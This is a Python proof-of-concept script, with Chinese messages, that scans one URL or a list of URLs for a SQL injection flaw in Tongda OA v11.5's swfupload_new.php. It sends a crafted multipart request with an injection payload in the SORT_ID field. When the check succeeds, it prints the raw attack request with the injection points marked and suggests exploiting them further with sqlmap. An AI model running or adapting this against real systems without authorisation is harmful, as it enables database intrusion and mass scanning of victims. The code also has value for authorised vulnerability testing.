import time
import argparse
import requests
import multiprocessing
import urllib3
from rich.console import Console


console = Console()
def now_time():
    return time.strftime("[%H:%M:%S] ", time.localtime())
    
def main(target_url):
    if target_url[:4]!='http':
        target_url = 'http://' + target_url
    if target_url[-1]!='/':
        target_url += '/' 
    headers = {
        "User-Agent": "Go-http-client/1.1",
        "Accept-Encoding":"gzip",
        "Content-Type":"multipart/form-data; boundary=----------GFioQpMK0vv2"
        }
    data='''------------GFioQpMK0vv2
Content-Disposition: form-data; name="ATTACHMENT_ID"

1
------------GFioQpMK0vv2
Content-Disposition: form-data; name="ATTACHMENT_NAME"

1
------------GFioQpMK0vv2
Content-Disposition: form-data; name="FILE_SORT"

2
------------GFioQpMK0vv2
Content-Disposition: form-data; name="SORT_ID"

0--
------------GFioQpMK0vv2--
'''
    exp_url=target_url+'general/file_folder/swfupload_new.php'
    console.print(now_time() + " [INFO]     正在检测通达OA v11.5 swfupload_new.php SQL注入漏洞", style='bold blue')
    try:
        requests.packages.urllib3.disable_warnings()
        upload = requests.post(exp_url, headers=headers, data=data, verify=False)
        if upload.status_code == 200 and '不安全的SQL语句' in upload.text:
            console.print(now_time() + ' [SUCCESS]  可能存在POST_sql注入漏洞 请使用sqlmap尝试进一步利用', style='bold green')
            console.print(now_time() + ''' [SUCCESS]  请修改数据包为:
                       POST /general/file_folder/swfupload_new.php HTTP/1.1
                       Host: {}   #ip地址
                       User-Agent: Go-http-client/1.1
                       Content-Length: 355
                       Content-Type: multipart/form-data; boundary=----------GFioQpMK0vv2
                       Accept-Encoding: gzip
    
                       ------------GFioQpMK0vv2
                       Content-Disposition: form-data; name="ATTACHMENT_ID"
    
                       1
                       ------------GFioQpMK0vv2
                       Content-Disposition: form-data; name="ATTACHMENT_NAME"
                       
                       1
                       ------------GFioQpMK0vv2
                       Content-Disposition: form-data; name="FILE_SORT"

                       2   #可能存在的注入点
                       ------------GFioQpMK0vv2
                       Content-Disposition: form-data; name="SORT_ID"
           
                       0-- #可能存在的注入点
                       ------------GFioQpMK0vv2--''', style='bold green')
        else:
            console.print(now_time() + ' [WARNING]  不存在通达OA v11.5 swfupload_new.php SQL注入漏洞', style='bold red ')
    except:
        console.print(now_time() + " [ERROR]    未知错误，无法利用poc请求目标或被目标拒绝请求, ", style='bold red')
        
if __name__ == "__main__":
    try:
        parser = argparse.ArgumentParser()
        parser.add_argument('-u', '--url', dest='url', help='Target Url')
        parser.add_argument('-f', '--file', dest='file', help='Target Url File', type=argparse.FileType('r'))
        args = parser.parse_args()
        if args.file:
            pool = multiprocessing.Pool()
            for url in args.file:
                pool.apply_async(main, args=(url.strip('\n'),))
            pool.close()
            pool.join()
        elif args.url:
            main(args.url)
        else:
            print('缺少URL目标, 请使用 [-u URL] or [-f FILE]')
    except KeyboardInterrupt:
        console.print('\nCTRL+C 退出', style='reverse bold red')
            
        